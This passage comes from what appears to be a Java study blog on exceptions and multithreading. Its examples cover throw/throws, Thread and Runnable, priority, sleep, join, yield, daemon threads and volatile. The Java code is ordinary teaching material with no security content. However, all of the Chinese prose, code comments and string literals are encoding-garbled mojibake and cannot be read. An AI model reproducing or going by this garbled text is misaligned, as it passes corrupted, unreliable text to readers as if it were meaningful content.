finallyå¤„ç†å¼‚å¸¸</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906232454261.png" alt="image-20220906232454261"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906234338231.png" alt="image-20220906234338231"></p><h2 id="ä½¿ç”¨throwå’Œthrowså¤„ç†å¼‚å¸¸"><a href="#ä½¿ç”¨throwå’Œthrowså¤„ç†å¼‚å¸¸" class="headerlink" title="ä½¿ç”¨throwå’Œthrowså¤„ç†å¼‚å¸¸"></a>ä½¿ç”¨throwå’Œthrowså¤„ç†å¼‚å¸¸</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220907002856303.png" alt="image-20220907002856303"></p><p>ç¤ºä¾‹ä»£ç ä¸€:</p><pre><code class="java">package com.sakura.exception.throwexception;public class ThrowException2 &#123;    public static void main(String[] args) &#123;        try&#123;            showMessage(4);        &#125;catch (ArrayIndexOutOfBoundsException e)&#123;            System.err.println(e.getMessage());            System.out.println(&quot;è¿™è¡Œä¹Ÿæ‰§è¡Œå•¦&quot;);        &#125;    &#125;    public static void showMessage(int index)&#123;        int [] arr = &#123;1,2,3&#125;;        if(index &lt;0 || index &gt;= arr.length)&#123;            throw new ArrayIndexOutOfBoundsException(&quot;æ•°ç»„ä¸‹æ ‡è¶Šç•Œäº†ï¼&quot;);        &#125;        System.out.println(arr[index]);    &#125;&#125;</code></pre><p>æ­¤ä¸ºè¿è¡Œæ—¶å¼‚å¸¸:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220907010102445.png" alt="image-20220907010102445"></p><p>ç¤ºä¾‹ä»£ç äºŒ:</p><pre><code class="java">package com.sakura.exception.throwexception;import java.io.File;import java.io.FileNotFoundException;public class ThrowException &#123;    public static void main(String[] args) &#123;        try &#123;            showMessage();        &#125; catch (FileNotFoundException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static void showMessage() throws FileNotFoundException&#123;        File file = new File(&quot;C:\\Users\\Sakura\\Desktop\\å›¾ç‰‡\\love.jpg&quot;);        boolean exists = file.exists();        if(!exists)&#123;            throw new FileNotFoundException(&quot;æ–‡ä»¶ä¸å­˜åœ¨o&quot;);        &#125;        System.out.println(exists);    &#125;&#125;</code></pre><p>è¿™é‡Œæ˜¯ä¸€ä¸ªç¼–è¯‘æ—¶å¼‚å¸¸ï¼Œå¿…é¡»åœ¨æ–¹æ³•ååthrowå¼‚å¸¸</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220907004537390.png" alt="image-20220907004537390"></p><h2 id="å¼‚å¸¸ç±»æ–¹æ³•é‡å†™"><a href="#å¼‚å¸¸ç±»æ–¹æ³•é‡å†™" class="headerlink" title="å¼‚å¸¸ç±»æ–¹æ³•é‡å†™"></a>å¼‚å¸¸ç±»æ–¹æ³•é‡å†™</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220910224705836.png" alt="image-20220910224705836"></p><p>å¦‚ï¼Œæ­¤æ—¶å­ç±»çš„å¼‚å¸¸æ¯”çˆ¶ç±»å¤§å°±ä¼šæŠ¥é”™ï¼Œå°†å¼‚å¸¸æ¢ä½ç½®å³å¯ï¼</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220910225655631.png" alt="image-20220910225655631"></p><h2 id="è‡ªå®šä¹‰å¼‚å¸¸çš„æ–¹å¼"><a href="#è‡ªå®šä¹‰å¼‚å¸¸çš„æ–¹å¼" class="headerlink" title="è‡ªå®šä¹‰å¼‚å¸¸çš„æ–¹å¼"></a>è‡ªå®šä¹‰å¼‚å¸¸çš„æ–¹å¼</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220910231023392.png" alt="image-20220910231023392"></p><h1 id="day15"><a href="#day15" class="headerlink" title="day15"></a>day15</h1><h2 id="å¤šçº¿ç¨‹ç®€ä»‹"><a href="#å¤šçº¿ç¨‹ç®€ä»‹" class="headerlink" title="å¤šçº¿ç¨‹ç®€ä»‹"></a>å¤šçº¿ç¨‹ç®€ä»‹</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220911001841326.png" alt="image-20220911001841326"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220911002102628.png" alt="image-20220911002102628"></p><p>å¦‚ä½•ç¼–å†™å¤šçº¿ç¨‹ç¨‹åºï¼Ÿ</p><ul><li>ç»§æ‰¿threadç±»</li><li>å®ç°Runnableæ¥å£</li><li>å®ç°Callableæ¥å£</li><li>çº¿ç¨‹æ± </li></ul><h2 id="å®ç°å¤šçº¿ç¨‹æ–¹å¼ä¸€-ç»§æ‰¿Threadç±»"><a href="#å®ç°å¤šçº¿ç¨‹æ–¹å¼ä¸€-ç»§æ‰¿Threadç±»" class="headerlink" title="å®ç°å¤šçº¿ç¨‹æ–¹å¼ä¸€:ç»§æ‰¿Threadç±»"></a>å®ç°å¤šçº¿ç¨‹æ–¹å¼ä¸€:ç»§æ‰¿Threadç±»</h2><p>åˆ›å»ºä¸¤æ¡çº¿ç¨‹:</p><p>é‡‡ç”¨ç»§æ‰¿çš„æ–¹å¼åˆ›å»ºå¤šçº¿ç¨‹</p><ul><li>åˆ›å»ºä¸€ä¸ªç±»ç»§æ‰¿Thead</li><li>é‡å†™runæ–¹æ³•ï¼Œå¤šçº¿ç¨‹ä¼šæ‰§è¡Œé‡å†™çš„æ–¹æ³•</li><li>å¯åŠ¨çº¿ç¨‹:çº¿ç¨‹å¯¹è±¡.start()</li></ul><pre><code class="java">Thread.currentThead().getName()  # è·å–å½“å‰çº¿ç¨‹åç§°</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.thread.extendthread;public class Test1 &#123;    public static void main(String[] args) &#123;        Thread.currentThread().setName(&quot;è¿™æ˜¯çº¿ç¨‹ä¸€&quot;); //è®¾ç½®ä¸»çº¿ç¨‹çš„åå­—        RabbitThead rabbitThead = new RabbitThead(); //åˆ›å»ºå¯¹è±¡        rabbitThead.setName(&quot;è¿™æ˜¯çº¿ç¨‹äºŒ&quot;); //è®¾ç½®ç¬¬äºŒä¸ªçº¿ç¨‹åå­—        rabbitThead.start(); //å¯åŠ¨rabbitTheadçº¿ç¨‹        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;ä¹Œé¾Ÿæ­£åœ¨è·‘&quot;);        &#125;    &#125;&#125;</code></pre><p>RabbitThread.java</p><pre><code class="java">package com.sakura.thread.extendthread;public class RabbitThead extends Thread&#123;    public void run()&#123;        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;å…”å­æ­£åœ¨è·‘&quot;);        &#125;    &#125;&#125;</code></pre><p>è¿è¡Œç»“æœ:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220911004936337.png" alt="image-20220911004936337"></p><h2 id="åˆ›å»ºå¤šçº¿ç¨‹æ–¹å¼äºŒ-å®ç°Runnableæ¥å£"><a href="#åˆ›å»ºå¤šçº¿ç¨‹æ–¹å¼äºŒ-å®ç°Runnableæ¥å£" class="headerlink" title="åˆ›å»ºå¤šçº¿ç¨‹æ–¹å¼äºŒ:å®ç°Runnableæ¥å£"></a>åˆ›å»ºå¤šçº¿ç¨‹æ–¹å¼äºŒ:å®ç°Runnableæ¥å£</h2><ul><li>åˆ›å»ºä¸€ä¸ªå¯¹è±¡å®ç° Runnableæ¥å£</li><li>é‡å†™runæ–¹æ³•</li><li>åˆ›å»º Runnableå¯¹è±¡</li><li>åˆ›å»ºThreadå¯¹è±¡ å°† Runnableå¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’</li><li>è°ƒç”¨start()æ–¹æ³•ï¼Œå¯åŠ¨çº¿ç¨‹</li></ul><p>ç»§æ‰¿Threadç±»ä¸å®ç°Runnableæ¥å£åˆ›å»ºå¤šçº¿ç¨‹æ–¹æ³•å¯¹æ¯”:</p><ul><li>ç»§æ‰¿çš„æ–¹å¼ç®€å•</li><li>å®ç°Runnableæ¥å£å¯ä»¥æ›´å¥½çš„å®ç°èµ„æºå…±äº«</li></ul><p>ç¤ºä¾‹ä»£ç :</p><p>Test.java</p><pre><code class="java">package com.sakura.thread.runnablethread;public class Test &#123;    public static void main(String[] args) &#123;        Thread.currentThread().setName(&quot;è¿™æ˜¯çº¿ç¨‹ä¸€&quot;);        //1.åˆ›å»ºRunnableå¯¹è±¡        RabbitRunnable rabbitRunnable = new RabbitRunnable();        //2.åˆ›å»ºTheadç±»ï¼Œå°† Runnableå¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’        Thread t1 = new Thread(rabbitRunnable);        t1.setName(&quot;è¿™æ˜¯çº¿ç¨‹äºŒ&quot;); //è®¾ç½®çº¿ç¨‹äºŒåå­—        t1.start();        //å¼€å¯çº¿ç¨‹        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;ä¹Œé¾Ÿè·‘&quot;);        &#125;    &#125;&#125;</code></pre><p>RabbitRunnable.java</p><pre><code class="java">package com.sakura.thread.runnablethread;public class RabbitRunnable implements Runnable&#123;    @Override    public void run() &#123;        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;å…”å­è·‘&quot;);        &#125;    &#125;&#125;</code></pre><p>è¿è¡Œç»“æœ:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220911012040254.png" alt="image-20220911012040254"></p><h2 id="é‡‡ç”¨åŒ¿åå†…éƒ¨ç±»çš„æ–¹å¼åˆ›å»ºå¤šçº¿ç¨‹ç¨‹åº"><a href="#é‡‡ç”¨åŒ¿åå†…éƒ¨ç±»çš„æ–¹å¼åˆ›å»ºå¤šçº¿ç¨‹ç¨‹åº" class="headerlink" title="é‡‡ç”¨åŒ¿åå†…éƒ¨ç±»çš„æ–¹å¼åˆ›å»ºå¤šçº¿ç¨‹ç¨‹åº"></a>é‡‡ç”¨åŒ¿åå†…éƒ¨ç±»çš„æ–¹å¼åˆ›å»ºå¤šçº¿ç¨‹ç¨‹åº</h2><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">package com.sakura.thread;import org.junit.Test;public class AnonymousTest &#123;    public static void main(String[] args) &#123;        new Thread()&#123;            @Override            public void run() &#123;                while (true)&#123;                    System.out.println(&quot;ä¹Œé¾Ÿè·‘&quot;);                &#125;            &#125;        &#125;.start();        new Thread(new Runnable() &#123;            @Override            public void run() &#123;                while (true)&#123;                    System.out.println(&quot;å…”å­è·‘&quot;);                &#125;            &#125;        &#125;).start();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220911113641398.png" alt="image-20220911113641398"></p><h2 id="ä½¿ç”¨æ„é€ å™¨èµ‹å€¼çº¿ç¨‹å"><a href="#ä½¿ç”¨æ„é€ å™¨èµ‹å€¼çº¿ç¨‹å" class="headerlink" title="ä½¿ç”¨æ„é€ å™¨èµ‹å€¼çº¿ç¨‹å"></a>ä½¿ç”¨æ„é€ å™¨èµ‹å€¼çº¿ç¨‹å</h2><p><strong>ä¸€ã€ç»§æ‰¿Threadç±»æ„é€ å™¨</strong></p><p>ä½¿ç”¨ç»§æ‰¿çš„æ–¹å¼ï¼Œå¯ä»¥é‡‡ç”¨thisè°ƒç”¨çˆ¶ç±»èµ„æºgetName()</p><pre><code class="java">package com.sakura.thread;public class Test1 &#123;    public static void main(String[] args) &#123;        RabbitThread1 t1 = new RabbitThread1(&quot;å°ç™½å…”&quot;);        RabbitThread1 t2 = new RabbitThread1(&quot;å°ç°å…”&quot;);        t1.start();        t2.start();    &#125;&#125;class RabbitThread1 extends Thread&#123;    public RabbitThread1(String name) &#123;        super(name);    &#125;    @Override    public void run() &#123;        for (int i = 0;i&lt;5;i++)&#123;            System.out.println(this.getName()+&quot;æ­£åœ¨è·‘&quot;);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912221159272.png" alt="image-20220912221159272"></p><p>è°ƒç”¨çˆ¶ç±»æ„é€ å™¨</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912221227523.png" alt="image-20220912221227523"></p><p><strong>äºŒã€ç»§æ‰¿Runnableæ¥å£</strong></p><pre><code class="java">package com.sakura.thread;public class Test2 &#123;    public static void main(String[] args) &#123;        ToriseThread toriseThread = new ToriseThread();        Thread t1 = new Thread(toriseThread,&quot;ç»¿æ¯›é¾Ÿ&quot;);        Thread t2 = new Thread(toriseThread,&quot;æ°å°¼é¾Ÿ&quot;);        t1.start();        t2.start();    &#125;&#125;class ToriseThread implements Runnable&#123;    @Override    public void run() &#123;        for (int i = 0;i&lt;5;i++)&#123;            System.out.println(Thread.currentThread().getName()); //ç»§æ‰¿Runnableæ— æ³•è°ƒç”¨this        &#125;    &#125;&#125;</code></pre><h2 id="çº¿ç¨‹å¸¸ç”¨æ–¹æ³•"><a href="#çº¿ç¨‹å¸¸ç”¨æ–¹æ³•" class="headerlink" title="çº¿ç¨‹å¸¸ç”¨æ–¹æ³•"></a>çº¿ç¨‹å¸¸ç”¨æ–¹æ³•</h2><p><strong>æ„é€ æ–¹æ³•:</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912172319527.png" alt="image-20220912172319527"></p><p><strong>å¸¸ç”¨æ–¹æ³•ç³»åˆ—:</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912172409403.png" alt="image-20220912172409403"></p><p><strong>æ„é€ å™¨è®¾ç½®åå­—:</strong></p><p>Test.java</p><pre><code class="java">package com.sakura.thread;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;å°ç™½å…”&quot;);        Thread t2 = new Thread(rabbitThread,&quot;å°é»‘å…”&quot;);        System.out.println(&quot;t1.isAlive()=&quot;+t1.isAlive());        System.out.println(&quot;t2.isAlive()=&quot;+t2.isAlive());        t1.start();        t2.start();        System.out.println(&quot;t1.isAlive()=&quot;+t1.isAlive());        System.out.println(&quot;t2.isAlive()=&quot;+t2.isAlive());    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;æ­£åœ¨è·‘&quot;);        &#125;    &#125;&#125;</code></pre><p><strong>è®¾ç½®ä¼˜å…ˆçº§:</strong></p><pre><code>setPriority(ä¼˜å…ˆçº§):    1&lt;= ä¼˜å…ˆçº§ &lt;=10// å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œçº¿ç¨‹çš„é»˜è®¤ä¼˜å…ˆçº§ä¸º5// ä¼˜å…ˆçº§ä½ä¹Ÿä¼šæ‰§è¡Œï¼Œä¹Ÿæœ‰æ‰§è¡Œæœºä¼š </code></pre><p>Test.java</p><pre><code class="java">package com.sakura.thread;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;å°ç™½å…”&quot;);        Thread t2 = new Thread(rabbitThread,&quot;å°é»‘å…”&quot;);        t1.setPriority(10);        t2.setPriority(1);        t1.start();        t2.start();    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        for(int i =0;i&lt;20;i++)&#123;            System.out.println(Thread.currentThread().getName()+&quot;æ­£åœ¨è·‘&quot;);        &#125;    &#125;&#125;</code></pre><p>è¾“å‡ºç»“æœ:</p><pre><code class="java">å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°ç™½å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘å°é»‘å…”æ­£åœ¨è·‘</code></pre><p><strong>è®¾ç½®ç¡çœ :</strong></p><p>Test.java</p><pre><code class="java">package com.sakura.thread;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;å°ç™½å…”&quot;);        Thread t2 = new Thread(rabbitThread,&quot;å°é»‘å…”&quot;);        t1.setPriority(10);        t2.setPriority(1);        t1.start();        t2.start();    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        for(int i =0;i&lt;100;i++)&#123;            //runæ–¹æ³•å‡ºç°å¼‚å¸¸åªèƒ½é‡‡ç”¨ try&#123;&#125;catch&#123;&#125;æ–¹å¼å¤„ç† å› ä¸ºå­ç±»ä¸èƒ½æŠ›å‡ºæ¯”çˆ¶ç±»æ›´å¤§çš„å¼‚å¸¸            //è€ŒRunnableä¸­æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸            try &#123;                Thread.sleep(1000); //å•ä½æ˜¯æ¯«ç§’            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;            System.out.println(Thread.currentThread().getName()+&quot;æ­£åœ¨è·‘&quot;);        &#125;    &#125;&#125;</code></pre><p><strong>ä½¿ç”¨joinæ–¹æ³•æ’é˜Ÿ:</strong></p><p>æ’é˜Ÿçš„çº¿ç¨‹è°ƒç”¨join(2000)é‚£ä¹ˆè¢«æ’é˜Ÿçš„çº¿ç¨‹è¦è¿›è¡Œç­‰å¾… 2000msç­‰æ’é˜Ÿçš„çº¿ç¨‹æ‰§è¡Œå®Œæ¯•åæˆ–è€…ç­‰å¾…æ—¶é—´å·²åˆ°é‚£ä¹ˆç»§ç»­æ‰§è¡Œ</p><pre><code class="java">package com.sakura.thread;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;å°ç™½å…”&quot;);        t1.start();        for(int i=0;i&lt;20;i++)&#123;            if (i==10)&#123;                try &#123;                    t1.join();                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;            &#125;            System.out.println(&quot;ä¸»çº¿ç¨‹è·‘\t&quot;+i);        &#125;    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        for(int i =0;i&lt;20;i++)&#123;            System.out.println(Thread.currentThread().getName()+&quot;\tæ­£åœ¨è·‘\t&quot;+i);        &#125;    &#125;&#125;</code></pre><p>è¾“å‡º:</p><pre><code>ä¸»çº¿ç¨‹è·‘    0ä¸»çº¿ç¨‹è·‘    1ä¸»çº¿ç¨‹è·‘    2ä¸»çº¿ç¨‹è·‘    3ä¸»çº¿ç¨‹è·‘    4ä¸»çº¿ç¨‹è·‘    5ä¸»çº¿ç¨‹è·‘    6ä¸»çº¿ç¨‹è·‘    7ä¸»çº¿ç¨‹è·‘    8å°ç™½å…”    æ­£åœ¨è·‘    0ä¸»çº¿ç¨‹è·‘    9å°ç™½å…”    æ­£åœ¨è·‘    1å°ç™½å…”    æ­£åœ¨è·‘    2å°ç™½å…”    æ­£åœ¨è·‘    3å°ç™½å…”    æ­£åœ¨è·‘    4å°ç™½å…”    æ­£åœ¨è·‘    5å°ç™½å…”    æ­£åœ¨è·‘    6å°ç™½å…”    æ­£åœ¨è·‘    7å°ç™½å…”    æ­£åœ¨è·‘    8å°ç™½å…”    æ­£åœ¨è·‘    9å°ç™½å…”    æ­£åœ¨è·‘    10å°ç™½å…”    æ­£åœ¨è·‘    11å°ç™½å…”    æ­£åœ¨è·‘    12å°ç™½å…”    æ­£åœ¨è·‘    13å°ç™½å…”    æ­£åœ¨è·‘    14å°ç™½å…”    æ­£åœ¨è·‘    15å°ç™½å…”    æ­£åœ¨è·‘    16å°ç™½å…”    æ­£åœ¨è·‘    17å°ç™½å…”    æ­£åœ¨è·‘    18å°ç™½å…”    æ­£åœ¨è·‘    19ä¸»çº¿ç¨‹è·‘    10ä¸»çº¿ç¨‹è·‘    11ä¸»çº¿ç¨‹è·‘    12ä¸»çº¿ç¨‹è·‘    13ä¸»çº¿ç¨‹è·‘    14ä¸»çº¿ç¨‹è·‘    15ä¸»çº¿ç¨‹è·‘    16ä¸»çº¿ç¨‹è·‘    17ä¸»çº¿ç¨‹è·‘    18ä¸»çº¿ç¨‹è·‘    19</code></pre><p>å¦‚æœæˆ‘ä»¬è®¾ç½®ä¸‹ç­‰å¾…æ—¶é—´:</p><pre><code class="java">package com.sakura.thread;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;å°ç™½å…”&quot;);        t1.start();        for(int i=0;i&lt;20;i++)&#123;            if (i==10)&#123;                try &#123;                    t1.join(2000);                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;            &#125;            System.out.println(&quot;ä¸»çº¿ç¨‹è·‘\t&quot;+i);        &#125;    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        for(int i =0;i&lt;20;i++)&#123;            try &#123;                Thread.sleep(4000);            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;            System.out.println(Thread.currentThread().getName()+&quot;\tæ­£åœ¨è·‘\t&quot;+i);        &#125;    &#125;&#125;</code></pre><p>æ­¤æ—¶è¾“å‡ºç»“æœ:</p><pre><code class="java">ä¸»çº¿ç¨‹è·‘    0ä¸»çº¿ç¨‹è·‘    1ä¸»çº¿ç¨‹è·‘    2ä¸»çº¿ç¨‹è·‘    3ä¸»çº¿ç¨‹è·‘    4ä¸»çº¿ç¨‹è·‘    5ä¸»çº¿ç¨‹è·‘    6ä¸»çº¿ç¨‹è·‘    7ä¸»çº¿ç¨‹è·‘    8ä¸»çº¿ç¨‹è·‘    9ä¸»çº¿ç¨‹è·‘    10ä¸»çº¿ç¨‹è·‘    11ä¸»çº¿ç¨‹è·‘    12ä¸»çº¿ç¨‹è·‘    13ä¸»çº¿ç¨‹è·‘    14ä¸»çº¿ç¨‹è·‘    15ä¸»çº¿ç¨‹è·‘    16ä¸»çº¿ç¨‹è·‘    17ä¸»çº¿ç¨‹è·‘    18ä¸»çº¿ç¨‹è·‘    19å°ç™½å…”    æ­£åœ¨è·‘    0å°ç™½å…”    æ­£åœ¨è·‘    1    ...</code></pre><h2 id="å¸¸ç”¨æ–¹æ³•ç³»åˆ—äºŒ"><a href="#å¸¸ç”¨æ–¹æ³•ç³»åˆ—äºŒ" class="headerlink" title="å¸¸ç”¨æ–¹æ³•ç³»åˆ—äºŒ"></a>å¸¸ç”¨æ–¹æ³•ç³»åˆ—äºŒ</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912224414761.png" alt="image-20220912224414761"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912225128380.png" alt="image-20220912225128380"></p><p><strong>yield()æ–¹æ³•-çº¿ç¨‹çš„ç¤¼è®©</strong></p><p>æ‰€è°“çº¿ç¨‹çš„ç¤¼è®©ä¸è¿‡æ˜¯ä»è¿è¡ŒçŠ¶æ€å…ˆå›åˆ°å°±ç»ªçŠ¶æ€ï¼Œäº‹å®ä¸Šï¼Œå½“ä¼˜å…ˆçº§ç›¸åŒæ—¶ï¼Œå®ƒä»¬ä»ç„¶å…·æœ‰ç›¸åŒçš„æ¦‚ç‡è¢«è°ƒç”¨ï¼</p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">package com.sakura.thread.method;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;å°ç°å…”&quot;);        t1.start();        for (int i =0; i&lt;20;i++)&#123;            if (i==5)&#123;                Thread.yield();            &#125;            System.out.println(Thread.currentThread().getName()+&quot;\tæ­£åœ¨è¿è¡Œ\t&quot;+i);        &#125;    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        for(int i = 0; i&lt;20; i++)&#123;            System.out.println(Thread.currentThread().getName()+&quot;\tæ­£åœ¨è¿è¡Œ\t&quot;+i);        &#125;    &#125;&#125;</code></pre><p><strong>stop()ä¸setDaemon(true)</strong></p><pre><code class="java">stop() //ç»“æŸçº¿ç¨‹setDaemon(true) //å®ˆæŠ¤çº¿ç¨‹        </code></pre><p>setDaemonçš„ç¤ºä¾‹ç”¨æ³•:</p><pre><code class="java">package com.sakura.thread.method;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;å°ç°å…”&quot;);        t1.setDaemon(true);        t1.start();        for (int i =0; i&lt;30;i++)&#123;            System.out.println(Thread.currentThread().getName()+&quot;\tæ­£åœ¨è¿è¡Œ\t&quot;+i);        &#125;    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;\tæ­£åœ¨è¿è¡Œ\t&quot;);        &#125;    &#125;&#125;</code></pre><p>t1è¿›ç¨‹æ˜¯ä¸»è¿›ç¨‹çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œå½“ä¸»è¿›ç¨‹åœæ­¢æ—¶ï¼Œt1ä¹Ÿä¼šéšä¹‹åœæ­¢</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912233804696.png" alt="image-20220912233804696"></p><p><strong>volatile</strong></p><p>volatileçš„ä½œç”¨æ˜¯ç¡®ä¿ä¸ä¼šå› ç¼–è¯‘å™¨çš„ä¼˜åŒ–è€Œçœç•¥æŸäº›æŒ‡ä»¤ï¼Œvolatileçš„å˜é‡æ˜¯è¯´è¿™å˜é‡å¯èƒ½ä¼šè¢«æ„æƒ³ä¸åˆ°åœ°æ”¹å˜ï¼Œæ¯æ¬¡éƒ½å°å¿ƒåœ°é‡æ–°è¯»å–è¿™ä¸ªå˜é‡çš„å€¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ä¿å­˜åœ¨å¯„å­˜å™¨é‡Œçš„å¤‡ä»½ï¼Œè¿™æ ·ï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šå»å‡è®¾è¿™ä¸ªå˜é‡çš„å€¼äº†ã€‚</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913001220149.png" alt="image-20220913001220149"></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">package com.sakura.thread.method;public class Test &#123;    public volatile static boolean flag = true; //å½“æ²¡æœ‰åŠ volatileç¨‹åºä¸ä¼šç»“æŸï¼ŒåŠ ä¸Šåæ‰ä¼šç»“æŸ    public static void main(String[] args) &#123;        new Thread(new Runnable() &#123;            @Override            public void run() &#123;                while (flag)&#123;//                    System.out.println(&quot;ç¨‹åºæ‰§è¡Œä¸­~~~&quot;);                &#125;            &#125;        &#125;).start();        try &#123;            Thread.sleep(1000);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;        flag = false;    &#125;&#125;</code></pre><h2 id="çº¿ç¨‹å®‰å…¨"><a href="#çº¿ç¨‹å®‰å…¨" class="headerlink" title="çº¿ç¨‹å®‰å…¨"></a>çº¿ç¨‹å®‰å…¨</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913002500973.png" alt="image-20220913002500973"></p><p>çº¿ç¨‹å®‰å…¨é—®é¢˜:å½“å¤šä¸ªçº¿ç¨‹æ“ä½œå…±äº«æ•°æ®æ—¶æœ‰å¯èƒ½ä¼šå‘ç”Ÿçº¿ç¨‹å®‰å…¨é—®é¢˜<br>è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜:<br>åŒæ­¥ä»£ç å—<br>åŒæ­¥æ–¹æ³•<br>Lock : å…¬å¹³é” éå…¬å¹³é” 